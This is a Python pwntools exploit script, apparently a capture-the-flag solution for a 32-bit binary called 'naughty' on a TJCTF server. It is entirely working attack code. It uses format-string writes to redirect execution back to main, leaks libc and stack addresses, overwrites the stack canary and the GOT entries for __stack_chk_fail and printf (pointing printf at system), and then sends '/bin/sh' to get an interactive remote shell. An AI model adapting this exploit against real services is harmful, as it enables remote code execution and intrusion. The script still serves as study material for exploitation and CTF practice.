from pwn import *

context(arch='i386')
bin = ELF('./naughty')
libc = ELF('libc-2.27.so')
p = remote('p1.tjctf.org', 8004)

p.recvuntil('name?\n')
write1 = {0x08049bac:bin.symbols['main']}
payload = fmtstr_payload(7, write1) + "pepega %2$p poggers %81$p" #pepega is my marker for libc, poggers is my marker for stack
print payload
p.sendline(payload)
p.recvuntil('pepega ')
leak = int(p.recv(10), 16)
libc.address = leak - libc.symbols['_IO_2_1_stdin_']
log.info("Leak: " + hex(leak))
log.info("Base: " + hex(libc.address))

p.recvuntil('poggers ')
canary = int(p.recv(10), 16) - 408 #offset from this stack leak to canary
log.info("Canary address: " + hex(canary))


write2 = {canary:0xdeadbeef, bin.got['__stack_chk_fail']:bin.symbols['main'], bin.got['printf']:libc.symbols['system']}
payload = fmtstr_payload(7, write2)
p.recvuntil('name?\n')
p.sendline(payload)
p.recvuntil('name?\n')
p.sendline("/bin/sh")
p.interactive()